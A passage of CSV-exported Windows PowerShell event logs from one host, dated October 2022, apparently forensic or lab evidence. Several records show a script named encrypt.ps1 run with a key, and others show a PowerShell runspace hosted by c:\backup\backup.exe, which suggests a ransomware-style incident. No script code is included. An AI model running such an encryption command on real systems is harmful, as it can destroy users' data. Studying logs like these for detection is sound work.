+	CommandLine=",-,-,-,-,-,-,-,-,-,-,-,-,-,-,5.1.19041.1237,Variable,Started,-,-,-,"powershell, .\encrypt.ps1, -key, B5KyIru7em96jpU0l9cIkKPAOV0fs52khTlay13kp3P=",4,powershell .\encrypt.ps1 -key B5KyIru7em96jpU0l9cIkKPAOV0fs52khTlay13kp3P=,powershell .\encrypt.ps1 -key B5KyIru7em96jpU0l9cIkKPAOV0fs52khTlay13kp3P=,6a48ad1f-a337-4099-8934-c29e134d04a3,-,-,-,-,-,ConsoleHost,ConsoleHost,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,wineventlog,Windows PowerShell,DESKTOP-32EH6N8,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,600.0,-,-,Info,-,-,-,PowerShell,349.0,Provider Lifecycle,-,-,-,-,-,-,-,-
+10,"Oct 25, 2022 @ 04:35:53.796",DESKTOP-32EH6N8,Provider Lifecycle,600,powershell,-,PowerShell,5,info,-,-,-,-,-,-,-,-,x86_64,DESKTOP-32EH6N8,45429efd-c10a-4299-8a01-8a10b0cbf1b8,"fe80::7959:555c:b4f7:82d3, 192.168.170.20, fe80::f415:e770:257d:42d7, 169.254.66.215","00:0c:29:6e:f6:d9, f8:89:d2:da:70:74",DESKTOP-32EH6N8,19044.1288,windows,10.0.19041.1288 (WinBuild.160101.0800),Windows 10 Pro,Windows 10 Pro,windows,windows,10.0,information,"Provider ""Environment"" is Started. 
+
+Details: 
+	ProviderName=Environment
+	NewProviderState=Started
+
+	SequenceNumber=5
+
+	HostName=ConsoleHost
+	HostVersion=5.1.19041.1237
+	HostId=6a48ad1f-a337-4099-8934-c29e134d04a3
+	HostApplication=powershell .\encrypt.ps1 -key B5KyIru7em96jpU0l9cIkKPAOV0fs52khTlay13kp3P=
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=",-,-,-,-,-,-,-,-,-,-,-,-,-,-,5.1.19041.1237,Environment,Started,-,-,-,"powershell, .\encrypt.ps1, -key, B5KyIru7em96jpU0l9cIkKPAOV0fs52khTlay13kp3P=",4,powershell .\encrypt.ps1 -key B5KyIru7em96jpU0l9cIkKPAOV0fs52khTlay13kp3P=,powershell .\encrypt.ps1 -key B5KyIru7em96jpU0l9cIkKPAOV0fs52khTlay13kp3P=,6a48ad1f-a337-4099-8934-c29e134d04a3,-,-,-,-,-,ConsoleHost,ConsoleHost,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,wineventlog,Windows PowerShell,DESKTOP-32EH6N8,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,600.0,-,-,Info,-,-,-,PowerShell,346.0,Provider Lifecycle,-,-,-,-,-,-,-,-
+11,"Oct 25, 2022 @ 04:35:53.780",DESKTOP-32EH6N8,Provider Lifecycle,600,powershell,-,PowerShell,3,info,-,-,-,-,-,-,-,-,x86_64,DESKTOP-32EH6N8,45429efd-c10a-4299-8a01-8a10b0cbf1b8,"fe80::7959:555c:b4f7:82d3, 192.168.170.20, fe80::f415:e770:257d:42d7, 169.254.66.215","00:0c:29:6e:f6:d9, f8:89:d2:da:70:74",DESKTOP-32EH6N8,19044.1288,windows,10.0.19041.1288 (WinBuild.160101.0800),Windows 10 Pro,Windows 10 Pro,windows,windows,10.0,information,"Provider ""Alias"" is Started. 
+
+Details: 
+	ProviderName=Alias
+	NewProviderState=Started
+
+	SequenceNumber=3
+
+	HostName=ConsoleHost
+	HostVersion=5.1.19041.1237
+	HostId=6a48ad1f-a337-4099-8934-c29e134d04a3
+	HostApplication=powershell .\encrypt.ps1 -key B5KyIru7em96jpU0l9cIkKPAOV0fs52khTlay13kp3P=
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=",-,-,-,-,-,-,-,-,-,-,-,-,-,-,5.1.19041.1237,Alias,Started,-,-,-,"powershell, .\encrypt.ps1, -key, B5KyIru7em96jpU0l9cIkKPAOV0fs52khTlay13kp3P=",4,powershell .\encrypt.ps1 -key B5KyIru7em96jpU0l9cIkKPAOV0fs52khTlay13kp3P=,powershell .\encrypt.ps1 -key B5KyIru7em96jpU0l9cIkKPAOV0fs52khTlay13kp3P=,6a48ad1f-a337-4099-8934-c29e134d04a3,-,-,-,-,-,ConsoleHost,ConsoleHost,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,wineventlog,Windows PowerShell,DESKTOP-32EH6N8,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,600.0,-,-,Info,-,-,-,PowerShell,345.0,Provider Lifecycle,-,-,-,-,-,-,-,-
+12,"Oct 25, 2022 @ 04:35:53.764",DESKTOP-32EH6N8,Provider Lifecycle,600,powershell,-,PowerShell,1,info,-,-,-,-,-,-,-,-,x86_64,DESKTOP-32EH6N8,45429efd-c10a-4299-8a01-8a10b0cbf1b8,"fe80::7959:555c:b4f7:82d3, 192.168.170.20, fe80::f415:e770:257d:42d7, 169.254.66.215","00:0c:29:6e:f6:d9, f8:89:d2:da:70:74",DESKTOP-32EH6N8,19044.1288,windows,10.0.19041.1288 (WinBuild.160101.0800),Windows 10 Pro,Windows 10 Pro,windows,windows,10.0,information,"Provider ""Registry"" is Started. 
+
+Details: 
+	ProviderName=Registry
+	NewProviderState=Started
+
+	SequenceNumber=1
+
+	HostName=ConsoleHost
+	HostVersion=5.1.19041.1237
+	HostId=6a48ad1f-a337-4099-8934-c29e134d04a3
+	HostApplication=powershell .\encrypt.ps1 -key B5KyIru7em96jpU0l9cIkKPAOV0fs52khTlay13kp3P=
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=",-,-,-,-,-,-,-,-,-,-,-,-,-,-,5.1.19041.1237,Registry,Started,-,-,-,"powershell, .\encrypt.ps1, -key, B5KyIru7em96jpU0l9cIkKPAOV0fs52khTlay13kp3P=",4,powershell .\encrypt.ps1 -key B5KyIru7em96jpU0l9cIkKPAOV0fs52khTlay13kp3P=,powershell .\encrypt.ps1 -key B5KyIru7em96jpU0l9cIkKPAOV0fs52khTlay13kp3P=,6a48ad1f-a337-4099-8934-c29e134d04a3,-,-,-,-,-,ConsoleHost,ConsoleHost,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,wineventlog,Windows PowerShell,DESKTOP-32EH6N8,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,600.0,-,-,Info,-,-,-,PowerShell,344.0,Provider Lifecycle,-,-,-,-,-,-,-,-
+13,"Oct 25, 2022 @ 04:33:38.876",DESKTOP-32EH6N8,Engine Lifecycle,403,powershell,-,PowerShell,15,end,-,-,-,-,-,-,-,-,x86_64,DESKTOP-32EH6N8,45429efd-c10a-4299-8a01-8a10b0cbf1b8,"fe80::7959:555c:b4f7:82d3, 192.168.170.20, fe80::f415:e770:257d:42d7, 169.254.66.215","00:0c:29:6e:f6:d9, f8:89:d2:da:70:74",DESKTOP-32EH6N8,19044.1288,windows,10.0.19041.1288 (WinBuild.160101.0800),Windows 10 Pro,Windows 10 Pro,windows,windows,10.0,information,"Engine state is changed from Available to Stopped. 
+
+Details: 
+	NewEngineState=Stopped
+	PreviousEngineState=Available
+
+	SequenceNumber=15
+
+	HostName=ConsoleHost
+	HostVersion=5.1.19041.1237
+	HostId=58c38348-f20d-4329-aa40-09065fb5c7b9
+	HostApplication=powershell
+	EngineVersion=5.1.19041.1237
+	RunspaceId=4edf0dd5-0a9c-402a-a85d-eb234ffe3a5e
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=",-,-,-,-,-,-,-,Stopped,Available,5.1.19041.1237,-,-,-,-,5.1.19041.1237,-,-,4edf0dd5-0a9c-402a-a85d-eb234ffe3a5e,-,-,powershell,1,powershell,powershell,58c38348-f20d-4329-aa40-09065fb5c7b9,-,-,-,-,-,ConsoleHost,ConsoleHost,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,wineventlog,Windows PowerShell,DESKTOP-32EH6N8,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,403.0,-,-,Info,-,-,-,PowerShell,343.0,Engine Lifecycle,-,-,-,-,-,-,-,-
+14,"Oct 25, 2022 @ 04:32:46.383",DESKTOP-32EH6N8,Engine Lifecycle,400,powershell,-,PowerShell,13,start,-,-,-,-,-,-,-,-,x86_64,DESKTOP-32EH6N8,45429efd-c10a-4299-8a01-8a10b0cbf1b8,"fe80::7959:555c:b4f7:82d3, 192.168.170.20, fe80::f415:e770:257d:42d7, 169.254.66.215","00:0c:29:6e:f6:d9, f8:89:d2:da:70:74",DESKTOP-32EH6N8,19044.1288,windows,10.0.19041.1288 (WinBuild.160101.0800),Windows 10 Pro,Windows 10 Pro,windows,windows,10.0,information,"Engine state is changed from None to Available. 
+
+Details: 
+	NewEngineState=Available
+	PreviousEngineState=None
+
+	SequenceNumber=13
+
+	HostName=ConsoleHost
+	HostVersion=5.1.19041.1237
+	HostId=58c38348-f20d-4329-aa40-09065fb5c7b9
+	HostApplication=powershell
+	EngineVersion=5.1.19041.1237
+	RunspaceId=4edf0dd5-0a9c-402a-a85d-eb234ffe3a5e
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=",-,-,-,-,-,-,-,Available,None,5.1.19041.1237,-,-,-,-,5.1.19041.1237,-,-,4edf0dd5-0a9c-402a-a85d-eb234ffe3a5e,-,-,powershell,1,powershell,powershell,58c38348-f20d-4329-aa40-09065fb5c7b9,-,-,-,-,-,ConsoleHost,ConsoleHost,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,wineventlog,Windows PowerShell,DESKTOP-32EH6N8,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,400.0,-,-,Info,-,-,-,PowerShell,342.0,Engine Lifecycle,-,-,-,-,-,-,-,-
+15,"Oct 25, 2022 @ 04:32:46.208",DESKTOP-32EH6N8,Provider Lifecycle,600,powershell,-,PowerShell,5,info,-,-,-,-,-,-,-,-,x86_64,DESKTOP-32EH6N8,45429efd-c10a-4299-8a01-8a10b0cbf1b8,"fe80::7959:555c:b4f7:82d3, 192.168.170.20, fe80::f415:e770:257d:42d7, 169.254.66.215","00:0c:29:6e:f6:d9, f8:89:d2:da:70:74",DESKTOP-32EH6N8,19044.1288,windows,10.0.19041.1288 (WinBuild.160101.0800),Windows 10 Pro,Windows 10 Pro,windows,windows,10.0,information,"Provider ""Environment"" is Started. 
+
+Details: 
+	ProviderName=Environment
+	NewProviderState=Started
+
+	SequenceNumber=5
+
+	HostName=ConsoleHost
+	HostVersion=5.1.19041.1237
+	HostId=58c38348-f20d-4329-aa40-09065fb5c7b9
+	HostApplication=powershell
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=",-,-,-,-,-,-,-,-,-,-,-,-,-,-,5.1.19041.1237,Environment,Started,-,-,-,powershell,1,powershell,powershell,58c38348-f20d-4329-aa40-09065fb5c7b9,-,-,-,-,-,ConsoleHost,ConsoleHost,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,wineventlog,Windows PowerShell,DESKTOP-32EH6N8,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,600.0,-,-,Info,-,-,-,PowerShell,338.0,Provider Lifecycle,-,-,-,-,-,-,-,-
+16,"Oct 25, 2022 @ 04:32:46.208",DESKTOP-32EH6N8,Provider Lifecycle,600,powershell,-,PowerShell,7,info,-,-,-,-,-,-,-,-,x86_64,DESKTOP-32EH6N8,45429efd-c10a-4299-8a01-8a10b0cbf1b8,"fe80::7959:555c:b4f7:82d3, 192.168.170.20, fe80::f415:e770:257d:42d7, 169.254.66.215","00:0c:29:6e:f6:d9, f8:89:d2:da:70:74",DESKTOP-32EH6N8,19044.1288,windows,10.0.19041.1288 (WinBuild.160101.0800),Windows 10 Pro,Windows 10 Pro,windows,windows,10.0,information,"Provider ""FileSystem"" is Started. 
+
+Details: 
+	ProviderName=FileSystem
+	NewProviderState=Started
+
+	SequenceNumber=7
+
+	HostName=ConsoleHost
+	HostVersion=5.1.19041.1237
+	HostId=58c38348-f20d-4329-aa40-09065fb5c7b9
+	HostApplication=powershell
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=",-,-,-,-,-,-,-,-,-,-,-,-,-,-,5.1.19041.1237,FileSystem,Started,-,-,-,powershell,1,powershell,powershell,58c38348-f20d-4329-aa40-09065fb5c7b9,-,-,-,-,-,ConsoleHost,ConsoleHost,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,wineventlog,Windows PowerShell,DESKTOP-32EH6N8,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,600.0,-,-,Info,-,-,-,PowerShell,339.0,Provider Lifecycle,-,-,-,-,-,-,-,-
+17,"Oct 25, 2022 @ 04:32:46.208",DESKTOP-32EH6N8,Provider Lifecycle,600,powershell,-,PowerShell,9,info,-,-,-,-,-,-,-,-,x86_64,DESKTOP-32EH6N8,45429efd-c10a-4299-8a01-8a10b0cbf1b8,"fe80::7959:555c:b4f7:82d3, 192.168.170.20, fe80::f415:e770:257d:42d7, 169.254.66.215","00:0c:29:6e:f6:d9, f8:89:d2:da:70:74",DESKTOP-32EH6N8,19044.1288,windows,10.0.19041.1288 (WinBuild.160101.0800),Windows 10 Pro,Windows 10 Pro,windows,windows,10.0,information,"Provider ""Function"" is Started. 
+
+Details: 
+	ProviderName=Function
+	NewProviderState=Started
+
+	SequenceNumber=9
+
+	HostName=ConsoleHost
+	HostVersion=5.1.19041.1237
+	HostId=58c38348-f20d-4329-aa40-09065fb5c7b9
+	HostApplication=powershell
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=",-,-,-,-,-,-,-,-,-,-,-,-,-,-,5.1.19041.1237,Function,Started,-,-,-,powershell,1,powershell,powershell,58c38348-f20d-4329-aa40-09065fb5c7b9,-,-,-,-,-,ConsoleHost,ConsoleHost,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,wineventlog,Windows PowerShell,DESKTOP-32EH6N8,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,600.0,-,-,Info,-,-,-,PowerShell,340.0,Provider Lifecycle,-,-,-,-,-,-,-,-
+18,"Oct 25, 2022 @ 04:32:46.208",DESKTOP-32EH6N8,Provider Lifecycle,600,powershell,-,PowerShell,11,info,-,-,-,-,-,-,-,-,x86_64,DESKTOP-32EH6N8,45429efd-c10a-4299-8a01-8a10b0cbf1b8,"fe80::7959:555c:b4f7:82d3, 192.168.170.20, fe80::f415:e770:257d:42d7, 169.254.66.215","00:0c:29:6e:f6:d9, f8:89:d2:da:70:74",DESKTOP-32EH6N8,19044.1288,windows,10.0.19041.1288 (WinBuild.160101.0800),Windows 10 Pro,Windows 10 Pro,windows,windows,10.0,information,"Provider ""Variable"" is Started. 
+
+Details: 
+	ProviderName=Variable
+	NewProviderState=Started
+
+	SequenceNumber=11
+
+	HostName=ConsoleHost
+	HostVersion=5.1.19041.1237
+	HostId=58c38348-f20d-4329-aa40-09065fb5c7b9
+	HostApplication=powershell
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=",-,-,-,-,-,-,-,-,-,-,-,-,-,-,5.1.19041.1237,Variable,Started,-,-,-,powershell,1,powershell,powershell,58c38348-f20d-4329-aa40-09065fb5c7b9,-,-,-,-,-,ConsoleHost,ConsoleHost,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,wineventlog,Windows PowerShell,DESKTOP-32EH6N8,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,600.0,-,-,Info,-,-,-,PowerShell,341.0,Provider Lifecycle,-,-,-,-,-,-,-,-
+19,"Oct 25, 2022 @ 04:32:46.192",DESKTOP-32EH6N8,Provider Lifecycle,600,powershell,-,PowerShell,1,info,-,-,-,-,-,-,-,-,x86_64,DESKTOP-32EH6N8,45429efd-c10a-4299-8a01-8a10b0cbf1b8,"fe80::7959:555c:b4f7:82d3, 192.168.170.20, fe80::f415:e770:257d:42d7, 169.254.66.215","00:0c:29:6e:f6:d9, f8:89:d2:da:70:74",DESKTOP-32EH6N8,19044.1288,windows,10.0.19041.1288 (WinBuild.160101.0800),Windows 10 Pro,Windows 10 Pro,windows,windows,10.0,information,"Provider ""Registry"" is Started. 
+
+Details: 
+	ProviderName=Registry
+	NewProviderState=Started
+
+	SequenceNumber=1
+
+	HostName=ConsoleHost
+	HostVersion=5.1.19041.1237
+	HostId=58c38348-f20d-4329-aa40-09065fb5c7b9
+	HostApplication=powershell
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=",-,-,-,-,-,-,-,-,-,-,-,-,-,-,5.1.19041.1237,Registry,Started,-,-,-,powershell,1,powershell,powershell,58c38348-f20d-4329-aa40-09065fb5c7b9,-,-,-,-,-,ConsoleHost,ConsoleHost,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,wineventlog,Windows PowerShell,DESKTOP-32EH6N8,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,600.0,-,-,Info,-,-,-,PowerShell,336.0,Provider Lifecycle,-,-,-,-,-,-,-,-
+20,"Oct 25, 2022 @ 04:32:46.192",DESKTOP-32EH6N8,Provider Lifecycle,600,powershell,-,PowerShell,3,info,-,-,-,-,-,-,-,-,x86_64,DESKTOP-32EH6N8,45429efd-c10a-4299-8a01-8a10b0cbf1b8,"fe80::7959:555c:b4f7:82d3, 192.168.170.20, fe80::f415:e770:257d:42d7, 169.254.66.215","00:0c:29:6e:f6:d9, f8:89:d2:da:70:74",DESKTOP-32EH6N8,19044.1288,windows,10.0.19041.1288 (WinBuild.160101.0800),Windows 10 Pro,Windows 10 Pro,windows,windows,10.0,information,"Provider ""Alias"" is Started. 
+
+Details: 
+	ProviderName=Alias
+	NewProviderState=Started
+
+	SequenceNumber=3
+
+	HostName=ConsoleHost
+	HostVersion=5.1.19041.1237
+	HostId=58c38348-f20d-4329-aa40-09065fb5c7b9
+	HostApplication=powershell
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=",-,-,-,-,-,-,-,-,-,-,-,-,-,-,5.1.19041.1237,Alias,Started,-,-,-,powershell,1,powershell,powershell,58c38348-f20d-4329-aa40-09065fb5c7b9,-,-,-,-,-,ConsoleHost,ConsoleHost,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,wineventlog,Windows PowerShell,DESKTOP-32EH6N8,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,600.0,-,-,Info,-,-,-,PowerShell,337.0,Provider Lifecycle,-,-,-,-,-,-,-,-
+21,"Oct 25, 2022 @ 04:27:01.500",DESKTOP-32EH6N8,Engine Lifecycle,403,powershell,-,PowerShell,21,end,-,-,-,-,-,-,-,-,x86_64,DESKTOP-32EH6N8,45429efd-c10a-4299-8a01-8a10b0cbf1b8,"fe80::7959:555c:b4f7:82d3, 192.168.170.20, fe80::f415:e770:257d:42d7, 169.254.66.215","00:0c:29:6e:f6:d9, f8:89:d2:da:70:74",DESKTOP-32EH6N8,19044.1288,windows,10.0.19041.1288 (WinBuild.160101.0800),Windows 10 Pro,Windows 10 Pro,windows,windows,10.0,information,"Engine state is changed from Available to Stopped. 
+
+Details: 
+	NewEngineState=Stopped
+	PreviousEngineState=Available
+
+	SequenceNumber=21
+
+	HostName=PSRunspace-Host
+	HostVersion=0.5.0.27
+	HostId=06c1e9c3-b8ab-453b-90d5-79b85bfa62fb
+	HostApplication=c:\backup\backup.exe
+	EngineVersion=5.1.19041.1237
+	RunspaceId=2a04aee9-5f9b-4c5b-82d7-5d1e91a47c18
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=",-,-,-,-,-,-,-,Stopped,Available,5.1.19041.1237,-,-,-,-,0.5.0.27,-,-,2a04aee9-5f9b-4c5b-82d7-5d1e91a47c18,-,-,c:\backup\backup.exe,1,c:\backup\backup.exe,c:\backup\backup.exe,06c1e9c3-b8ab-453b-90d5-79b85bfa62fb,-,-,-,-,-,PSRunspace-Host,PSRunspace-Host,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,wineventlog,Windows PowerShell,DESKTOP-32EH6N8,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,403.0,-,-,Info,-,-,-,PowerShell,335.0,Engine Lifecycle,-,-,-,-,-,-,-,-
+22,"Oct 25, 2022 @ 04:27:00.436",DESKTOP-32EH6N8,Provider Lifecycle,600,powershell,-,PowerShell,9,info,-,-,-,-,-,-,-,-,x86_64,DESKTOP-32EH6N8,45429efd-c10a-4299-8a01-8a10b0cbf1b8,"fe80::7959:555c:b4f7:82d3, 192.168.170.20, fe80::f415:e770:257d:42d7, 169.254.66.215","00:0c:29:6e:f6:d9, f8:89:d2:da:70:74",DESKTOP-32EH6N8,19044.1288,windows,10.0.19041.1288 (WinBuild.160101.0800),Windows 10 Pro,Windows 10 Pro,windows,windows,10.0,information,"Provider ""Function"" is Started. 
+
+Details: 
+	ProviderName=Function
+	NewProviderState=Started
+
+	SequenceNumber=9
+
+	HostName=PSRunspace-Host
+	HostVersion=0.5.0.27
+	HostId=06c1e9c3-b8ab-453b-90d5-79b85bfa62fb
+	HostApplication=c:\backup\backup.exe
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=",-,-,-,-,-,-,-,-,-,-,-,-,-,-,0.5.0.27,Function,Started,-,-,-,c:\backup\backup.exe,1,c:\backup\backup.exe,c:\backup\backup.exe,06c1e9c3-b8ab-453b-90d5-79b85bfa62fb,-,-,-,-,-,PSRunspace-Host,PSRunspace-Host,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,wineventlog,Windows PowerShell,DESKTOP-32EH6N8,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,600.0,-,-,Info,-,-,-,PowerShell,330.0,Provider Lifecycle,-,-,-,-,-,-,-,-
+23,"Oct 25, 2022 @ 04:27:00.436",DESKTOP-32EH6N8,Provider Lifecycle,600,powershell,-,PowerShell,11,info,-,-,-,-,-,-,-,-,x86_64,DESKTOP-32EH6N8,45429efd-c10a-4299-8a01-8a10b0cbf1b8,"fe80::7959:555c:b4f7:82d3, 192.168.170.20, fe80::f415:e770:257d:42d7, 169.254.66.215","00:0c:29:6e:f6:d9, f8:89:d2:da:70:74",DESKTOP-32EH6N8,19044.1288,windows,10.0.19041.1288 (WinBuild.160101.0800),Windows 10 Pro,Windows 10 Pro,windows,windows,10.0,information,"Provider ""Variable"" is Started. 
+
+Details: 
+	ProviderName=Variable
+	NewProviderState=Started
+
+	SequenceNumber=11
+
+	HostName=PSRunspace-Host
+	HostVersion=0.5.0.27
+	HostId=06c1e9c3-b8ab-453b-90d5-79b85bfa62fb
+	HostApplication=c:\backup\backup.exe
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=",-,-,-,-,-,-,-,-,-,-,-,-,-,-,0.5.0.27,Variable,Started,-,-,-,c:\backup\backup.exe,1,c:\backup\backup.exe,c:\backup\backup.exe,06c1e9c3-b8ab-453b-90d5-79b85bfa62fb,-,-,-,-,-,PSRunspace-Host,PSRunspace-Host,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,wineventlog,Windows PowerShell,DESKTOP-32EH6N8,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,600.0,-,-,Info,-,-,-,PowerShell,331.0,Provider Lifecycle,-,-,-,-,-,-,-,-
